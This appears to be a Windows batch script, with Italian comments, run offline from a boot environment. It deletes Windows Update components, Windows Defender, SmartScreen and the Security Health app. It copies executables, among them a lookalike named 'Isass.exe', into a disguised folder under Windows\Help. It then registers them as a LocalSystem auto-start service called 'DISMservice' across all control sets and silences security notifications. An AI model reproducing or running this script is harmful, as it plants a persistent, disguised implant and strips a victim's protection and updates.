@echo off
setlocal enabledelayedexpansion

for %%i in (C D E F G H I J K L M N O P Q R S T U V W) do (
    if exist %%i:\Windows\explorer.exe (
        set "WINLETTER=%%i:"
        goto :found
    )
)

:found
echo Windows trovato su !WINLETTER!

:: qui elimina i file di WUpdate
del /f /s /q "!WINLETTER!\Windows\SoftwareDistribution\"
del /f /s /q "!WINLETTER!\Windows\System32\wuauclt.exe"
del /f /s /q "!WINLETTER!\Windows\System32\wusa.exe"
del /f /s /q "!WINLETTER!\Windows\System32\MoUsoCoreWorker.exe"
del /f /s /q "!WINLETTER!\Windows\System32\SIHClient.exe"
del /f /s /q "!WINLETTER!\Windows\System32\WaaSMedicAgent.exe"
del /f /s /q "!WINLETTER!\Windows\System32\WindowsUpdateElevatedInstaller.exe"
del /f /s /q "!WINLETTER!\Windows\System32\musnotification.exe"
del /f /s /q "!WINLETTER!\Windows\System32\musnotificationux.exe"


:: qui elimina WinDef
del /f /s /q "!WINLETTER!\Program Files\Windows Defender"
del /f /s /q "!WINLETTER!\Program Files\Windows Defender Advanced Threat Protection"
del /f /s /q "!WINLETTER!\ProgramData\Microsoft\Windows Defender"
del /f /s /q "!WINLETTER!\ProgramData\Microsoft\Windows Defender Advanced Threat Protection"
del /f /s /q "!WINLETTER!\Program Files\WindowsApps\*Microsoft.SecHealthUI*"
del /f /s /q "!WINLETTER!\Windows\System32\smartscreen.exe"


:: qui installa THWP
mkdir "!WINLETTER!\Windows\Help"
mkdir "!WINLETTER!\Windows\Help\mui"
mkdir "!WINLETTER!\Windows\Help\mui\0563"
mkdir "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic"
copy Isass.exe "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic\"
copy starter.exe "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic\"
copy WMIHost.exe "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic\"
copy wuasrv.exe "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic\"
copy 5633 "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic\"
copy nssm.exe "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic\"

:: Service Injection
reg load HKLM\zSYSTEM "!WINLETTER!\Windows\System32\Config\SYSTEM"
reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice" /v Type /t REG_DWORD /d 16 /f
reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice" /v Start /t REG_DWORD /d 2 /f
reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice" /v ErrorControl /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice" /v ImagePath /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\nssm.exe" /f
reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice" /v DisplayName /t REG_SZ /d "DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice" /v ObjectName /t REG_SZ /d "LocalSystem" /f
reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice" /v DelayedAutostart /t REG_DWORD /d 0 /f
reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice" /v FailureActionsOnNonCrashFailures /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice\Parameters" /v Application /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\starter.exe" /f
reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice\Parameters" /v AppParameters /t REG_EXPAND_SZ /d "" /f
reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice\Parameters" /v AppDirectory /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic" /f
reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice\Parameters\AppExit" /ve /t REG_SZ /d "Restart" /f

reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice" /v Type /t REG_DWORD /d 16 /f
reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice" /v Start /t REG_DWORD /d 2 /f
reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice" /v ErrorControl /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice" /v ImagePath /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\nssm.exe" /f
reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice" /v DisplayName /t REG_SZ /d "DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice" /v ObjectName /t REG_SZ /d "LocalSystem" /f
reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice" /v DelayedAutostart /t REG_DWORD /d 0 /f
reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice" /v FailureActionsOnNonCrashFailures /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice\Parameters" /v Application /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\starter.exe" /f
reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice\Parameters" /v AppParameters /t REG_EXPAND_SZ /d "" /f
reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice\Parameters" /v AppDirectory /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic" /f
reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice\Parameters\AppExit" /ve /t REG_SZ /d "Restart" /f

reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice" /v Type /t REG_DWORD /d 16 /f
reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice" /v Start /t REG_DWORD /d 2 /f
reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice" /v ErrorControl /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice" /v ImagePath /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\nssm.exe" /f
reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice" /v DisplayName /t REG_SZ /d "DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice" /v ObjectName /t REG_SZ /d "LocalSystem" /f
reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice" /v DelayedAutostart /t REG_DWORD /d 0 /f
reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice" /v FailureActionsOnNonCrashFailures /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice\Parameters" /v Application /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\starter.exe" /f
reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice\Parameters" /v AppParameters /t REG_EXPAND_SZ /d "" /f
reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice\Parameters" /v AppDirectory /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic" /f
reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice\Parameters\AppExit" /ve /t REG_SZ /d "Restart" /f

reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice" /v Type /t REG_DWORD /d 16 /f
reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice" /v Start /t REG_DWORD /d 2 /f
reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice" /v ErrorControl /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice" /v ImagePath /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\nssm.exe" /f
reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice" /v DisplayName /t REG_SZ /d "DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice" /v ObjectName /t REG_SZ /d "LocalSystem" /f
reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice" /v DelayedAutostart /t REG_DWORD /d 0 /f
reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice" /v FailureActionsOnNonCrashFailures /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice\Parameters" /v Application /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\starter.exe" /f
reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice\Parameters" /v AppParameters /t REG_EXPAND_SZ /d "" /f
reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice\Parameters" /v AppDirectory /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic" /f
reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice\Parameters\AppExit" /ve /t REG_SZ /d "Restart" /f

reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice" /v Type /t REG_DWORD /d 16 /f
reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice" /v Start /t REG_DWORD /d 2 /f
reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice" /v ErrorControl /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice" /v ImagePath /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\nssm.exe" /f
reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice" /v DisplayName /t REG_SZ /d "DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice" /v ObjectName /t REG_SZ /d "LocalSystem" /f
reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice" /v DelayedAutostart /t REG_DWORD /d 0 /f
reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice" /v FailureActionsOnNonCrashFailures /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice\Parameters" /v Application /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\starter.exe" /f
reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice\Parameters" /v AppParameters /t REG_EXPAND_SZ /d "" /f
reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice\Parameters" /v AppDirectory /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic" /f
reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice\Parameters\AppExit" /ve /t REG_SZ /d "Restart" /f

reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice" /v Type /t REG_DWORD /d 16 /f
reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice" /v Start /t REG_DWORD /d 2 /f
reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice" /v ErrorControl /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice" /v ImagePath /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\nssm.exe" /f
reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice" /v DisplayName /t REG_SZ /d "DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice" /v ObjectName /t REG_SZ /d "LocalSystem" /f
reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice" /v DelayedAutostart /t REG_DWORD /d 0 /f
reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice" /v FailureActionsOnNonCrashFailures /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice\Parameters" /v Application /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\starter.exe" /f
reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice\Parameters" /v AppParameters /t REG_EXPAND_SZ /d "" /f
reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice\Parameters" /v AppDirectory /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic" /f
reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice\Parameters\AppExit" /ve /t REG_SZ /d "Restart" /f

reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice" /v Type /t REG_DWORD /d 16 /f
reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice" /v Start /t REG_DWORD /d 2 /f
reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice" /v ErrorControl /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice" /v ImagePath /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\nssm.exe" /f
reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice" /v DisplayName /t REG_SZ /d "DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice" /v ObjectName /t REG_SZ /d "LocalSystem" /f
reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice" /v DelayedAutostart /t REG_DWORD /d 0 /f
reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice" /v FailureActionsOnNonCrashFailures /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice\Parameters" /v Application /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\starter.exe" /f
reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice\Parameters" /v AppParameters /t REG_EXPAND_SZ /d "" /f
reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice\Parameters" /v AppDirectory /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic" /f
reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice\Parameters\AppExit" /ve /t REG_SZ /d "Restart" /f

reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice" /v Type /t REG_DWORD /d 16 /f
reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice" /v Start /t REG_DWORD /d 2 /f
reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice" /v ErrorControl /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice" /v ImagePath /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\nssm.exe" /f
reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice" /v DisplayName /t REG_SZ /d "DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice" /v ObjectName /t REG_SZ /d "LocalSystem" /f
reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice" /v DelayedAutostart /t REG_DWORD /d 0 /f
reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice" /v FailureActionsOnNonCrashFailures /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice\Parameters" /v Application /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\starter.exe" /f
reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice\Parameters" /v AppParameters /t REG_EXPAND_SZ /d "" /f
reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice\Parameters" /v AppDirectory /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic" /f
reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice\Parameters\AppExit" /ve /t REG_SZ /d "Restart" /f

reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice" /v Type /t REG_DWORD /d 16 /f
reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice" /v Start /t REG_DWORD /d 2 /f
reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice" /v ErrorControl /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice" /v ImagePath /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\nssm.exe" /f
reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice" /v DisplayName /t REG_SZ /d "DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice" /v ObjectName /t REG_SZ /d "LocalSystem" /f
reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice" /v DelayedAutostart /t REG_DWORD /d 0 /f
reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice" /v FailureActionsOnNonCrashFailures /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice\Parameters" /v Application /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\starter.exe" /f
reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice\Parameters" /v AppParameters /t REG_EXPAND_SZ /d "" /f
reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice\Parameters" /v AppDirectory /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic" /f
reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice\Parameters\AppExit" /ve /t REG_SZ /d "Restart" /f
reg unload HKLM\zSYSTEM


:: WinDef e notifiche off
reg load HKLM\zSOFTWARE "!WINLETTER!\Windows\System32\Config\SOFTWARE"
reg add "HKLM\zSOFTWARE\Microsoft\Windows Defender Security Center" /f
reg add "HKLM\zSOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /f
reg add "HKLM\zSOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f
reg add "HKLM\zSOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /v DisableNotifications /t REG_DWORD /d 1 /f
reg add "HKLM\zSOFTWARE\Policies\Microsoft\Windows\PushNotifications" /v NoToastApplicationNotification /t REG_DWORD /d 1 /f
reg add "HKLM\zSOFTWARE\Policies\Microsoft\Windows\Explorer" /f
reg add "HKLM\zSOFTWARE\Policies\Microsoft\Windows\Explorer" /v DisableNotificationCenter /t REG_DWORD /d 1 /f
reg add "HKLM\zSOFTWARE\Policies\Microsoft\Windows Defender Security Center\Systray" /v HideSystray /t REG_DWORD /d 1 /f
reg unload HKLM\zSOFTWARE


echo Rebooting in 5 seconds...
wpeutil reboot
